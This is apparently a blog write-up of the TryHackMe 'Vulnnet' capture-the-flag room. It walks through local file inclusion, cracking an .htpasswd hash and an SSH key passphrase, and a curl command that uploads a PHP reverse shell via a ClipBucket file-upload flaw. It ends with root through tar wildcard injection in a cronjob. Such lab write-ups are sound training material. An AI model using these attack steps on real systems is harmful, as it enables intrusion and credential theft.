---
title: "Vulnnet TryHackMe"
collection: publications
permalink: /publication/Vulnnet
excerpt: 'This is a free machine from TryHackMe'
date: 2023-04-07
venue: '04-27'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/vulnnet.png)

**Link :** [Vulnnet](https://tryhackme.com/room/vulnnet1)

---

## Enumeration : 

* You will have to add the machine IP with domain vulnnet.thm to your */etc/hosts* file.

* Let's scan the target :

```bash
# nmap -sC -sV -T4 -Pn 10.10.15.220
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-07 05:59 EST
Nmap scan report for vulnnet.thm (10.10.249.21)
Host is up (0.098s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: VulnNet
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

=> The scan reveals 2 open ports.

* Let's navigate to http://vulnnet.thm/

![vulnnet2](/images/vulnnet2.png)

* Inspecting the source code of the main page, we see 2 Javascripts file in /js directory.

![vulnnet3](/images/vulnnet3.png)

![vulnnet4](/images/vulnnet4.png)

* The first file reveals a subdomain, let's add it to */etc/hosts*

![vulnnet5](/images/vulnnet5.png)

* The second file reveals that the index.php page accepts a referer parameter.

![vulnnet6](/images/vulnnet6.png)

* Navigating to http://broadcast.vulnnet.thm prompts us with an authentication login screen, but since we don't any credentials we can do nothing with it.

* Let's check if the referer parameter is vulnerable to Local File Inclusion (LFI)

![vulnnet7](/images/vulnnet7.png)

* As you can see, we are able to read the content of /etc/passwd

* From the scan, we know that we're dealing with apache web server, by default the web config file is in /etc/apache2/sites-enabled/000-default.conf

> https://devm.io/open-source/apache2-install-config-169923

![vulnnet8](/images/vulnnet8.png)

* Bingo, we found the location of the .htpasswd that contains the credentials for http://broadcast.vulnnet.thm

![vulnnet9](/images/vulnnet9.png)

* We found the credentials, but we have to crack the password.


```bash
# john pass.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761*******   (developers)     
1g 0:00:00:28 DONE (2023-04-07 11:09) 0.03498g/s 75617p/s 75617c/s 75617C/s 9982..99686420
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

* After you navigate to http://broadcast.vulnnet.thm and enter the credentials, you should see this page.

![vulnnet10](/images/vulnnet10.png)

* As you can see the broadcast subdomain is running *ClipBucket* which is an open source video sharing.

* Let's search if there are any known exploits:

![vulnnet11](/images/vulnnet11.png)

* So the exploit is an unauthenticated file upload, so we can upload a reverse shell.

* The payload should be something like this :

```bash
# curl -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" http://broadcast.vulnnet.thm/actions/photo_uploader.php -u developers:9972761*******
```

> shell.php: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

* The output reveals the file directory.

* Start your netcat listener and navigate to http://broadcast.vulnnet.thm/files/photos/your_directory

![vulnnet12](/images/vulnnet12.png)

* After you open the file in your browser, you will receive a connection.

![vulnnet13](/images/vulnnet13.png)

## Horizontal Privilege Escalation :

* If you check the */var/backups* directory you will find a file called ssh-backup.tar.gz

![vulnnet14](/images/vulnnet14.png)

* Open a python web server :

```bash
python -m http.server
```

* Download the file to your local machine:

```bash
wget http://X.X.X.X:8000/ssh-backup.tar.gz
```

* Uncompress the archive :

```bash
tar -xf ssh-backup.tar.gz
```

* Now we have the private key but we don't have a username, so let's check the home directory

![vulnnet17](/images/vulnnet17.png)

* We still have a problem because the ssh privte key is protected with a passphrase

![vulnnet15](/images/vulnnet15.png)

* Use ssh2john tool and try to brute force the passphrase with john

![vulnnet16](/images/vulnnet16.png)

* Now we can login using ssh.

![vulnnet18](/images/vulnnet18.png)


## Vertical Privilege Escalation :

* You will find a cronjob run by root every two minutes

![vulnnet19](/images/vulnnet19.png)

* Let's read the *backupsrv.sh*

![vulnnet20](/images/vulnnet20.png)

* As you can see the script is backing up all the files in the Documents folder using tar, the is a wildcard vulnerability.

>https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c

* The exploit :

![vulnnet21](/images/vulnnet21.png)

* Start a netcat listener and wait 2 minutes to get the root shell

![vulnnet22](/images/vulnnet22.png)





